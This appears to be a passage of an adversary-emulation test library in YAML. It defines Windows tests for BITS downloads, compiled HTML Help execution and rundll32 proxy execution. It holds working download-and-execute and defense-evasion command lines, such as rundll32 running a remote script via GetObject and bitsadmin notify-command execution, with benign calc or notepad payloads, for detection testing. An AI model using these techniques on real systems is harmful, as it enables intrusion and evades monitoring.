  - windows
  input_arguments:
    remote_file:
      description: Remote file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
    local_file:
      description: Local file path to save downloaded file
      type: Path
      default: '%temp%\bitsadmin1_flag.ps1'
  executor:
    command: |
      bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
    cleanup_command: |
      del #{local_file} >nul 2>&1
    name: command_prompt
- name: Bitsadmin Download (PowerShell)
  auto_generated_guid: f63b8bc4-07e5-4112-acba-56f646f3f0bc
  description: |
    This test simulates an adversary leveraging bitsadmin.exe to download
    and execute a payload leveraging PowerShell

    Upon execution you will find a github markdown file downloaded to the Temp directory
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: Remote file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
    local_file:
      description: Local file path to save downloaded file
      type: Path
      default: $env:TEMP\bitsadmin2_flag.ps1
  executor:
    command: |
      Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
    cleanup_command: |
      Remove-Item #{local_file} -ErrorAction Ignore
    name: powershell
- name: Persist, Download, & Execute
  auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
  description: |
    This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
    Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
    This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
    This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
  supported_platforms:
  - windows
  input_arguments:
    command_path:
      description: Path of command to execute
      type: Path
      default: C:\Windows\system32\notepad.exe
    bits_job_name:
      description: Name of BITS job
      type: String
      default: AtomicBITS
    local_file:
      description: Local file path to save downloaded file
      type: Path
      default: '%temp%\bitsadmin3_flag.ps1'
    remote_file:
      description: Remote file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
  executor:
    command: |
      bitsadmin.exe /create #{bits_job_name}
      bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
      bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
      bitsadmin.exe /resume #{bits_job_name}
      ping -n 5 127.0.0.1 >nul 2>&1
      bitsadmin.exe /complete #{bits_job_name}
    cleanup_command: |
      del #{local_file} >nul 2>&1
    name: command_prompt
- name: Bits download using desktopimgdownldr.exe (cmd)
  auto_generated_guid: afb5e09e-e385-4dee-9a94-6ee60979d114
  description: |
    This test simulates using desktopimgdownldr.exe to download a malicious file
    instead of a desktop or lockscreen background img. The process that actually makes 
    the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) 
    and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: Remote file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
    download_path:
      description: Local file path to save downloaded file
      type: Path
      default: 'SYSTEMROOT=C:\Windows\Temp'
    cleanup_path:
      description: path to delete file as part of cleanup_command
      type: Path
      default: C:\Windows\Temp\Personalization\LockScreenImage
    cleanup_file:
      description: file to remove as part of cleanup_command
      type: String
      default: "*.md"
  executor:
    command: |
      set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
    cleanup_command: |
      del #{cleanup_path}\#{cleanup_file} >nul 2>&1
    name: command_prompt



- name: Compiled HTML Help Local Payload
  auto_generated_guid: 5cb87818-0d7c-4469-b7ef-9224107aebe8
  description: |
    Uses hh.exe to execute a local compiled HTML Help payload.
    Upon execution calc.exe will open
  supported_platforms:
  - windows
  input_arguments:
    local_chm_file:
      description: Local .chm payload
      type: Path
      default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The payload must exist on disk at specified location (#{local_chm_file})
    prereq_command: |
      if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
  executor:
    command: |
      hh.exe #{local_chm_file}
    name: command_prompt
- name: Compiled HTML Help Remote Payload
  auto_generated_guid: 0f8af516-9818-4172-922b-42986ef1e81d
  description: |
    Uses hh.exe to execute a remote compiled HTML Help payload.
    Upon execution displays an error saying the file cannot be open
  supported_platforms:
  - windows
  input_arguments:
    remote_chm_file:
      description: Remote .chm payload
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
  executor:
    command: |
      hh.exe #{remote_chm_file}
    name: command_prompt
- name: Invoke CHM with default Shortcut Command Execution
  auto_generated_guid: 29d6f0d7-be63-4482-8827-ea77126c1ef7
  description: Executes a CHM file with the default Shortcut Command method.
  supported_platforms:
  - windows
  input_arguments:
    chm_file_path:
      description: Default path of CHM
      type: String
      default: Test.chm
    hh_file_path:
      description: path of modified HH.exe
      type: Path
      default: $env:windir\hh.exe
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
    name: powershell
- name: Invoke CHM with InfoTech Storage Protocol Handler
  auto_generated_guid: b4094750-5fc7-4e8e-af12-b4e36bf5e7f6
  description: Executes a CHM file with the ITS protocol handler.
  supported_platforms:
  - windows
  input_arguments:
    hh_file_path:
      description: path of modified HH.exe
      type: Path
      default: $env:windir\hh.exe
    infotech_storage_handler:
      description: Default InfoTech Storage Protocol Handler
      type: String
      default: its
    chm_file_path:
      description: Default path of CHM
      type: String
      default: Test.chm
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
    name: powershell
- name: Invoke CHM Simulate Double click
  auto_generated_guid: 5decef42-92b8-4a93-9eb2-877ddcb9401a
  description: Executes a CHM file simulating a user double click.
  supported_platforms:
  - windows
  input_arguments:
    chm_file_path:
      description: Default path of CHM
      type: String
      default: Test.chm
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}'
    name: powershell
- name: Invoke CHM with Script Engine and Help Topic
  auto_generated_guid: 4f83adda-f5ec-406d-b318-9773c9ca92e5
  description: Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.
  supported_platforms:
  - windows
  input_arguments:
    topic_extension:
      description: Default Help Topic
      type: String
      default: html
    hh_file_path:
      description: path of modified HH.exe
      type: Path
      default: $env:windir\hh.exe
    infotech_storage_handler:
      description: Default InfoTech Storage Protocol Handler
      type: String
      default: its
    script_engine:
      description: Default Script Engine
      type: String
      default: JScript
    chm_file_path:
      description: Default path of CHM
      type: String
      default: Test.chm
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
    name: powershell
- name: Invoke CHM Shortcut Command with ITS and Help Topic
  auto_generated_guid: 15756147-7470-4a83-87fb-bb5662526247
  description: Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.
  supported_platforms:
  - windows
  input_arguments:
    topic_extension:
      description: Default Help Topic
      type: String
      default: html
    hh_file_path:
      description: path of modified HH.exe
      type: Path
      default: $env:windir\hh.exe
    infotech_storage_handler:
      description: Default InfoTech Storage Protocol Handler
      type: string
      default: its
    chm_file_path:
      description: Default path of CHM
      type: String
      default: Test.chm
  dependencies:
  - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.
    prereq_command: |-
      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
      if (-not $RequiredModule) {exit 1}
      if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
    get_prereq_command: |
      Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
  executor:
    command: 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
    name: powershell
- name: Decompile Local CHM File
  auto_generated_guid: 20cb05e0-1fa5-406d-92c1-84da4ba01813
  description: |
    Uses hh.exe to decompile a local compiled HTML Help file.
    Upon successful execution the chm file will decompile to disk.
    Reference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
  supported_platforms:
  - windows
  input_arguments:
    local_chm_file:
      description: Local .chm payload
      type: Path
      default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The payload must exist on disk at specified location (#{local_chm_file})
    prereq_command: |
      if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
  executor:
    command: |
      hh.exe -decompile %temp% #{local_chm_file}
    cleanup_command: |
      del %temp%\T1218.001.html >nul 2>&1
    name: command_prompt



- name: Rundll32 execute JavaScript Remote Payload With GetObject
  auto_generated_guid: 57ba4ce9-ee7a-4f27-9928-3c70c489b59d
  description: |
    Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. 
    This has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)
    
    Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. 
  supported_platforms:
  - windows
  input_arguments:
    file_url:
      description: location of the payload
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
  executor:
    command: |
      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
    cleanup_command: |
      taskkill /IM notepad.exe /f
    name: command_prompt
- name: Rundll32 execute VBscript command
  auto_generated_guid: 638730e7-7aed-43dc-bf8c-8117f805f5bb
  description: |
    Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
    Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
    Upon execution calc.exe will be launched
  supported_platforms:
  - windows
  input_arguments:
    command_to_execute:
      description: Command for rundll32.exe to execute
      type: String
      default: calc.exe
  executor:
    command: |
      rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
    name: command_prompt
- name: Rundll32 execute VBscript command using Ordinal number
  auto_generated_guid: 32d1cf1b-cbc2-4c09-8d05-07ec5c83a821
  description: |
    Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
    Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
    Upon execution calc.exe will be launched
  supported_platforms:
  - windows
  input_arguments:
    command_to_execute:
      description: Command for rundll32.exe to execute
      type: String
      default: calc.exe
  executor:
    command: |
      rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
    name: command_prompt
- name: Rundll32 advpack.dll Execution
  auto_generated_guid: d91cae26-7fc1-457b-a854-34c8aad48c89
  description: |
    Test execution of a command using rundll32.exe with advpack.dll.
    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
    Upon execution calc.exe will be launched
  supported_platforms:
  - windows
  input_arguments:
    inf_to_execute:
      description: Local location of inf file
      type: String
      default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Inf file must exist on disk at specified location (#{inf_to_execute})
    prereq_command: |
      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
  executor:
    command: |
      rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
    name: command_prompt
- name: Rundll32 ieadvpack.dll Execution
  auto_generated_guid: 5e46a58e-cbf6-45ef-a289-ed7754603df9
  description: |
    Test execution of a command using rundll32.exe with ieadvpack.dll.
    Upon execution calc.exe will be launched

    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
  supported_platforms:
  - windows
  input_arguments:
    inf_to_execute:
      description: Local location of inf file
      type: String
      default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Inf file must exist on disk at specified location (#{inf_to_execute})
    prereq_command: |
      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
  executor:
    command: |
      rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
    name: command_prompt
- name: Rundll32 syssetup.dll Execution
  auto_generated_guid: 41fa324a-3946-401e-bbdd-d7991c628125
  description: |
    Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened

    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
  supported_platforms:
  - windows
  input_arguments:
    inf_to_execute:
      description: Local location of inf file
      type: String
      default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Inf file must exist on disk at specified location (#{inf_to_execute})
    prereq_command: |
      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
  executor:
    command: |
      rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 #{inf_to_execute}
    name: command_prompt
- name: Rundll32 setupapi.dll Execution
  auto_generated_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
  description: |
    Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened

    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
  supported_platforms:
  - windows
  input_arguments:
    inf_to_execute:
      description: Local location of inf file
      type: String
      default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Inf file must exist on disk at specified location (#{inf_to_execute})
    prereq_command: |
      if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
  executor:
    command: |
      rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 #{inf_to_execute}
    name: command_prompt
- name: Execution of HTA and VBS Files using Rundll32 and URL.dll
  auto_generated_guid: 22cfde89-befe-4e15-9753-47306b37a6e3
  description: |
    IcedID uses this TTP as follows:
      rundll32.exe url.dll,OpenURL %PUBLIC%\index.hta
    Trickbot uses this TTP as follows:
      rundll32.exe URL.dll,FileProtocolHandler C:\\..\\Detail\\akteullen.vbs
    
    In this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with "rundll32 spawned wscript"
  supported_platforms:
  - windows
  executor:
    command: |
      rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta
      rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs
    name: command_prompt
- name: Launches an executable using Rundll32 and pcwutl.dll
  auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
  description: |
    Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.
  supported_platforms:
  - windows
  input_arguments:
    exe_to_launch:
      description: Path of the executable to launch
      type: Path
      default: '%windir%\System32\notepad.exe'
  executor:
    command: |
      rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
    name: command_prompt
- name: Execution of non-dll using rundll32.exe
  auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
  description: |
    Rundll32.exe running non-dll 
  supported_platforms:
      - windows
  input_arguments:
    input_url:
      description: Url to download the DLL
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
    input_file:
      description: Non-dll file
      type: String
      default: C:\Users\$env:username\Downloads\calc.png
  dependency_executor_name: powershell 
  dependencies: 
  - description: |
      Non-dll file must exist on disk at specified location
    prereq_command: | 
      if (Test-Path #{input_file}) {exit 0} else {exit 1}
    get_prereq_command: | 
      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
  executor:
    name: powershell
    command: | 
      rundll32.exe #{input_file}, StartW
- name: Rundll32 with Ordinal Value
  auto_generated_guid: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
  description: |
    Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. 
    Upon successful execution, Calc.exe will spawn.
  supported_platforms:
      - windows
  input_arguments:
    input_url:
      description: Url to download the DLL
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
    input_file:
      description: DLL File
      type: String
      default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll
  dependency_executor_name: powershell 
  dependencies: 
  - description: |
      DLL file must exist on disk at specified location
    prereq_command: | 
      if (Test-Path #{input_file}) {exit 0} else {exit 1}
    get_prereq_command: | 
      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
  executor:
    name: command_prompt
    command: | 
      rundll32.exe #{input_file},#2
- name: Rundll32 with Control_RunDLL
  auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
  description: |
    Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. 
  supported_platforms:
      - windows
  input_arguments:
    input_url:
      description: Url to download the DLL
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
    input_file:
      description: DLL File
      type: String
      default: PathToAtomicsFolder\T1047\bin\calc.dll
  dependency_executor_name: powershell 
  dependencies: 
  - description: |
      DLL file must exist on disk at specified location
    prereq_command: | 
      if (Test-Path #{input_file}) {exit 0} else {exit 1}
    get_prereq_command: | 
      Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
  executor:
    name: command_prompt
    command: | 
      rundll32.exe shell32.dll,Control_RunDLL #{input_file}
- name: Rundll32 with desk.cpl
  auto_generated_guid: 83a95136-a496-423c-81d3-1c6750133917
  description: |
    Rundll32.exe loading an executable renamed as .scr using desk.cpl 
    Reference: 
      - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)
    SIGMA rules:
      - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_new_src_file.yml)
      - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml)
  supported_platforms:
      - windows
  input_arguments:
    exe_to_launch:
      description: Path of the executable to launch
      type: Path
      default: '%windir%\System32\calc.exe'
  executor:
    name: command_prompt
    command: | 
      copy #{exe_to_launch} not_an_scr.scr
      rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
    cleanup_command: 
      del not_an_scr.scr
